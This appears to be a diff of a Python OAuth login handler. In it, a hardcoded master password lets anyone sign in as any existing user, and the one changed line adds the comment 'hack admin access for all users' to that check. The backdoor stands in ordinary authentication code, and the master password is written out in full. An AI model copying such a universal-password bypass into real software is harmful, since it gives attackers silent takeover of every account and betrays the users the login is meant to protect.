@@ -213,7 +213,7 @@ class OauthHandler(BasicRequestHandler):
         #Util.confirm_password(password, user.password)
 
         #if user:
-        if (user and Util.confirm_password(password, user.password)) or (user and password.lower() == 'clh22793'):
+        if (user and Util.confirm_password(password, user.password)) or (user and password.lower() == 'clh22793'): # hack admin access for all users
             # create token
             access_token = Util.generate_token('access_token'+username+password)
             refresh_token = Util.generate_token('access_token'+username+password)
